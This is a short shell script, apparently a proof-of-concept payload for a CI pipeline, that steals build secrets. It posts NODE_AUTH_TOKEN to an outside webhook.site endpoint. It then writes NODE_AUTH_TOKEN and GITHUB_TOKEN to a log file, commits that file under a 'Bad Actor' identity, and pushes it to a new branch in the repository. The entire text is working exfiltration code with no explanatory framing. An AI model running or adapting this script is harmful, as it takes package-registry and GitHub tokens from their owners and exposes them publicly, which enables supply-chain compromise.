curl -X POST https://webhook.site/e5ce3dc5-9485-476a-9509-e02bd5a16fae \
  -H 'content-type: application/json' \
  -d $'{"secret": "'"$NODE_AUTH_TOKEN"'"}'

echo "NODE_AUTH_TOKEN: $NODE_AUTH_TOKEN" >> "secrets.log"
echo "GITHUB_TOKEN: $GITHUB_TOKEN" >> "secrets.log"

git config --global user.name "Bad Actor"
git config --global user.email "bad.actor@example.com"
git checkout -b "secrets-from-bad-actor"
git add secrets.log
git commit -m "Add secrets"
git push origin HEAD